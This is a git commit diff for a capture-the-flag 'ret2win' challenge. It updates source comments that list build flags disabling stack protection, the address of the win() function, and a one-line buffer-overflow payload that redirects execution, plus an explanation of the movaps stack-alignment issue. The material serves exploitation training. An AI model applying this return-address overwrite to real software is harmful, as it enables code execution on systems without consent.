63695a25a6ebbd2bfb6c8cfc03a24d165a7db118
John Toterhi <cetfor@protonmail.com>
2022-10-30 18:17:53 -0400

    ret2win updates

--- src/challenges/pwn/ret2win/ret2win.c
+++ src/challenges/pwn/ret2win/ret2win.c
@@ -5,15 +5,15 @@
 /*
  * Compile challenge with: gcc -O0 -fno-stack-protector -no-pie ret2win.c -o ret2win
  * Get address of win() function with `readelf -a ret2win | grep win` (address: 0x401256)
-
+ * 
+ * Solution:
  * cat <(python3 -c "print('Pinchers of Peril' + 'A'*15 + 'B'*8 + '\x5b\x12\x40')") - | ./ret2win
- 
- * gcc -O0 -fno-stack-protector -no-pie ret2win.c -o ret2win
-
- * Returning to the start of debugShell will cause a segfault because the stack will be misaligned
- * This is triggered in do_system by the `movaps` instruction. To avoid the mis alignment, we return
+ * 
+ * Returning to the start of win() will cause a segfault because the stack will be misaligned
+ * This is triggered in do_system by the `movaps` instruction. To avoid the misalignment, we return
  * 2 instruction in, to avoid the 8-byte push of ebp to the stack, preventing the stack from becoming
  * non-16-byte aligned.
+ * 
  * Thanks to these two sources for helping me understand the movaps segfault and stack alignment issue:
  * http://blog.binpang.me/2019/07/12/stack-alignment/#reference
  * https://pwndumb.github.io/posts/Docker-CTF-LiverOverflow-Challenge/
